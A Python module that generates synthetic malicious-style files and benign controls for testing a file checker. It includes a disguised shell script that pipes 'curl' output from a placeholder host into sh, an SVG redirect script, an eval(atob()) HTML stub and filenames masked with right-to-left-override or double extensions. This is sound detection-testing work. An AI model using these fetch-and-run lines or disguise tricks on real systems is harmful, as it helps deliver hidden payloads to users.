# SPDX-FileCopyrightText: 2026 Ruthvik Bandari
# SPDX-License-Identifier: Apache-2.0
"""Synthetic files for the file checker: malicious-style cases and benign controls, generated in memory.

No real malware is used or needed: each case is a few bytes built to carry one trait the checker is meant to
see (a PE header under a .pdf name, an Office package with a macro part, a zip whose entries are flagged
encrypted, a PDF with a program appended, an SVG with a script). They measure whether a rule exists and fires,
not real-world recall: the author wrote both the cases and the rules, so a pass says the rule does what its
author intended and nothing about malware in the wild. Families are reported separately and never pooled with
Govdocs. Each family has ``VARIANTS`` files; the first ``DEV_VARIANTS`` go to dev, the rest to the locked test.
"""

from __future__ import annotations

import io
import random
import struct
import zipfile
from collections.abc import Callable
from dataclasses import dataclass

from .common import SEED, seeded_key

VARIANTS = 30
DEV_VARIANTS = 20
MALICIOUS = "malicious"
RLO = chr(0x202E)  # right-to-left override: makes photo[RLO]gpj.exe display as photoexe.jpg
BENIGN_CONTROL = "benign"


@dataclass(frozen=True)
class Case:
    family: str
    label: str
    index: int
    name: str
    data: bytes
    expected: tuple[str, ...]  # finding ids the case is built to trigger (empty: nothing at medium or above)

    @property
    def side(self) -> str:
        return "dev" if self.index < DEV_VARIANTS else "test"

    @property
    def id(self) -> str:
        return seeded_key(SEED, f"synthetic|{self.family}|{self.index}")[:24]

    @property
    def group(self) -> str:
        return f"synthetic|{self.family}|{self.side}"


def _rng(family: str, index: int) -> random.Random:
    return random.Random(seeded_key(SEED, f"{family}|{index}"))  # noqa: S311 - seeded test data, not security


def _random_bytes(rng: random.Random, n: int) -> bytes:
    return bytes(rng.getrandbits(8) for _ in range(n))


def _words(rng: random.Random, n: int) -> bytes:
    vocab = ["quarterly", "report", "budget", "meeting", "schedule", "summary", "notes", "project", "review", "draft"]
    return " ".join(rng.choice(vocab) for _ in range(n)).encode()


def pe_image(rng: random.Random, tail: int = 4096, packed: bool = False) -> bytes:
    """A minimal MZ file with a PE signature; the tail is random (packed-looking) or a repeated pattern."""
    header = bytearray(0x80)
    header[:2] = b"MZ"
    struct.pack_into("<I", header, 0x3C, 0x80)
    body = b"PE\x00\x00" + b"\x4c\x01" + bytes(18)
    filler = _random_bytes(rng, tail) if packed else (b"\x90\x00\xcc\x00" * (tail // 4))
    return bytes(header) + body + filler


def elf_image(rng: random.Random) -> bytes:
    return b"\x7fELF\x02\x01\x01" + bytes(9) + (b"\x00\x01\x02\x03" * 400) + _words(rng, 5)


def pdf_doc(rng: random.Random) -> bytes:
    text = _words(rng, 30)
    return b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n(" + text + b")\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n"


def jpeg_image(rng: random.Random, size: int = 3000) -> bytes:
    return (
        b"\xff\xd8\xff\xe0\x00\x10JFIF\x00"
        + b"\x01\x01\x00\x48\x00\x48\x00\x00"
        + (b"\x10\x20\x30" * (size // 3))
        + b"\xff\xd9"
    )


def png_image(rng: random.Random) -> bytes:
    return b"\x89PNG\r\n\x1a\n" + b"\x00\x00\x00\rIHDR" + bytes(13) + (b"\x01\x02\x03\x04" * 500)


def _put(zf: zipfile.ZipFile, name: str, data: bytes | str) -> None:
    """Add an entry with a fixed timestamp, so the archive bytes are the same on every run."""
    zf.writestr(zipfile.ZipInfo(name, date_time=(2026, 1, 1, 0, 0, 0)), data, compress_type=zf.compression)


def office_zip(rng: random.Random, part: str, macro: bool) -> bytes:
    """A zip with the Office Open XML marker first, so the header sample sees ``[Content_Types].xml`` and ``part/``."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        _put(zf, "[Content_Types].xml", '<?xml version="1.0"?><Types/>')
        _put(zf, "_rels/.rels", '<?xml version="1.0"?><Relationships/>')
        _put(zf, f"{part}/document.xml", b"<doc>" + _words(rng, 60) + b"</doc>")
        if macro:
            _put(zf, f"{part}/vbaProject.bin", b"\xd0\xcf\x11\xe0" + _random_bytes(rng, 600))
    return buf.getvalue()


def plain_zip(rng: random.Random, encrypted: bool) -> bytes:
    """A zip of two stored text entries; ``encrypted`` sets the encryption flag (bit 0) in every header."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as zf:
        _put(zf, "readme.txt", _words(rng, 40))
        _put(zf, "data/table.csv", _words(rng, 40))
    data = bytearray(buf.getvalue())
    if encrypted:
        for sig, flag_at in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
            start = 0
            while (at := data.find(sig, start)) >= 0:
                data[at + flag_at] |= 0x01
                start = at + 4
    return bytes(data)


def svg_doc(rng: random.Random, script: bool) -> bytes:
    body = '<circle cx="50" cy="50" r="40"/>'
    if script:
        body += '<script type="text/javascript">document.location="http://example.invalid/x"</script>'
    return f'<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">{body}</svg>\n'.encode()


def html_doc(rng: random.Random, obfuscated: bool) -> bytes:
    if obfuscated:
        payload = _random_bytes(rng, 60).hex()
        script = f'eval(atob("{payload}"));document.write(unescape("%3C"))'
    else:
        script = "document.getElementById('x').textContent = 'hello';"
    return f"<!doctype html><html><body><p id='x'></p><script>{script}</script></body></html>\n".encode()


def script_text(rng: random.Random, kind: str) -> bytes:
    lines = {
        "vbs": 'Set sh = CreateObject("WScript.Shell")\nsh.Run "calc.exe"\n',
        "js": 'var sh = new ActiveXObject("WScript.Shell");\nsh.Run("calc.exe");\n',
        "bat": "@echo off\r\nstart calc.exe\r\n",
        "ps1": "Start-Process calc.exe\r\n",
        "hta": '<html><script language="VBScript">CreateObject("WScript.Shell").Run "calc.exe"</script></html>\n',
    }
    return lines[kind].encode() + b"' " + _words(rng, 3) + b"\n"


Builder = Callable[[random.Random, int], tuple[str, bytes]]


@dataclass(frozen=True)
class Family:
    name: str
    label: str
    expected: tuple[str, ...]
    build: Builder
    note: str = ""


def _n(index: int) -> str:
    return f"{1000 + index * 7}"


FAMILIES: tuple[Family, ...] = (
    Family(
        "double_ext_exe",
        MALICIOUS,
        ("double_extension",),
        lambda r, i: (f"invoice_{_n(i)}.pdf.exe", pe_image(r, packed=True)),
    ),
    Family("double_ext_scr", MALICIOUS, ("double_extension",), lambda r, i: (f"photo_{_n(i)}.jpg.scr", pe_image(r))),
    Family("bidi_name", MALICIOUS, ("bidi_control_in_name",), lambda r, i: (f"photo_{_n(i)}{RLO}gpj.exe", pe_image(r))),
    Family("pe_named_pdf", MALICIOUS, ("extension_mismatch",), lambda r, i: (f"statement_{_n(i)}.pdf", pe_image(r))),
    Family("pe_named_png", MALICIOUS, ("extension_mismatch",), lambda r, i: (f"scan_{_n(i)}.png", pe_image(r))),
    Family("elf_named_txt", MALICIOUS, ("extension_mismatch",), lambda r, i: (f"notes_{_n(i)}.txt", elf_image(r))),
    Family(
        "script_named_png",
        MALICIOUS,
        ("extension_mismatch",),
        lambda r, i: (f"logo_{_n(i)}.png", b"#!/bin/sh\ncurl http://example.invalid/x | sh\n" + _words(r, 4)),
    ),
    Family(
        "packed_pe",
        MALICIOUS,
        ("possible_packing",),
        lambda r, i: (f"setup_{_n(i)}.exe", pe_image(r, tail=24576, packed=True)),
        "installers and packed benign programs look identical",
    ),
    Family(
        "encrypted_blob",
        MALICIOUS,
        ("high_entropy_file",),
        lambda r, i: (f"report_{_n(i)}.docx.locked", _random_bytes(r, 20000)),
        "ransomware-style output; also any encrypted container",
    ),
    Family(
        "macro_docm",
        MALICIOUS,
        ("macro_office_file",),
        lambda r, i: (f"invoice_{_n(i)}.docm", office_zip(r, "word", True)),
        "legitimate macro-enabled documents look identical",
    ),
    Family(
        "macro_named_docx",
        MALICIOUS,
        ("macro_office_file",),
        lambda r, i: (f"invoice_{_n(i)}.docx", office_zip(r, "word", True)),
    ),
    Family(
        "macro_xlsm",
        MALICIOUS,
        ("macro_office_file",),
        lambda r, i: (f"sheet_{_n(i)}.xlsm", office_zip(r, "xl", True)),
        "legitimate macro-enabled workbooks look identical",
    ),
    Family(
        "encrypted_zip",
        MALICIOUS,
        ("encrypted_archive",),
        lambda r, i: (f"documents_{_n(i)}.zip", plain_zip(r, True)),
        "legitimate password-protected archives look identical",
    ),
    Family(
        "pdf_with_pe_appended",
        MALICIOUS,
        ("embedded_executable",),
        lambda r, i: (f"form_{_n(i)}.pdf", pdf_doc(r) + b"\n" * 64 + pe_image(r)),
    ),
    Family(
        "jpeg_with_pe_appended",
        MALICIOUS,
        ("embedded_executable",),
        lambda r, i: (f"holiday_{_n(i)}.jpg", jpeg_image(r, 900) + pe_image(r)),
    ),
    Family("svg_script", MALICIOUS, ("active_content_svg",), lambda r, i: (f"logo_{_n(i)}.svg", svg_doc(r, True))),
    Family(
        "script_attachment",
        MALICIOUS,
        ("runnable_script_file",),
        lambda r, i: (
            f"update_{_n(i)}.{('vbs', 'js', 'bat', 'ps1', 'hta')[i % 5]}",
            script_text(r, ("vbs", "js", "bat", "ps1", "hta")[i % 5]),
        ),
    ),
    Family(
        "html_obfuscated",
        MALICIOUS,
        (),
        lambda r, i: (f"secure_{_n(i)}.html", html_doc(r, True)),
        "no rule: HTML with script is ordinary; reported as a known gap",
    ),
    Family("ctrl_clean_docx", BENIGN_CONTROL, (), lambda r, i: (f"memo_{_n(i)}.docx", office_zip(r, "word", False))),
    Family("ctrl_clean_xlsx", BENIGN_CONTROL, (), lambda r, i: (f"budget_{_n(i)}.xlsx", office_zip(r, "xl", False))),
    Family("ctrl_clean_zip", BENIGN_CONTROL, (), lambda r, i: (f"archive_{_n(i)}.zip", plain_zip(r, False))),
    Family("ctrl_clean_pdf", BENIGN_CONTROL, (), lambda r, i: (f"paper_{_n(i)}.pdf", pdf_doc(r))),
    Family("ctrl_clean_svg", BENIGN_CONTROL, (), lambda r, i: (f"icon_{_n(i)}.svg", svg_doc(r, False))),
    Family("ctrl_clean_html", BENIGN_CONTROL, (), lambda r, i: (f"page_{_n(i)}.html", html_doc(r, False))),
    Family("ctrl_clean_png", BENIGN_CONTROL, (), lambda r, i: (f"image_{_n(i)}.png", png_image(r))),
    Family("ctrl_clean_jpg", BENIGN_CONTROL, (), lambda r, i: (f"photo_{_n(i)}.jpg", jpeg_image(r))),
    Family("ctrl_clean_txt", BENIGN_CONTROL, (), lambda r, i: (f"readme_{_n(i)}.txt", _words(r, 50))),
    Family("ctrl_clean_exe", BENIGN_CONTROL, (), lambda r, i: (f"tool_{_n(i)}.exe", pe_image(r))),
    Family(
        "ctrl_clean_sh",
        BENIGN_CONTROL,
        (),
        lambda r, i: (f"build_{_n(i)}.sh", b"#!/bin/sh\necho " + _words(r, 3) + b"\n"),
    ),
    Family(
        "ctrl_pdf_with_zip_text",
        BENIGN_CONTROL,
        (),
        lambda r, i: (f"book_{_n(i)}.pdf", pdf_doc(r) + b"PK\x03\x04 inline text " + _words(r, 5)),
    ),
)

FAMILY_BY_NAME = {f.name: f for f in FAMILIES}


def generate(variants: int = VARIANTS) -> list[Case]:
    cases = []
    for family in FAMILIES:
        for index in range(variants):
            name, data = family.build(_rng(family.name, index), index)
            cases.append(Case(family.name, family.label, index, name, data, family.expected))
    return cases
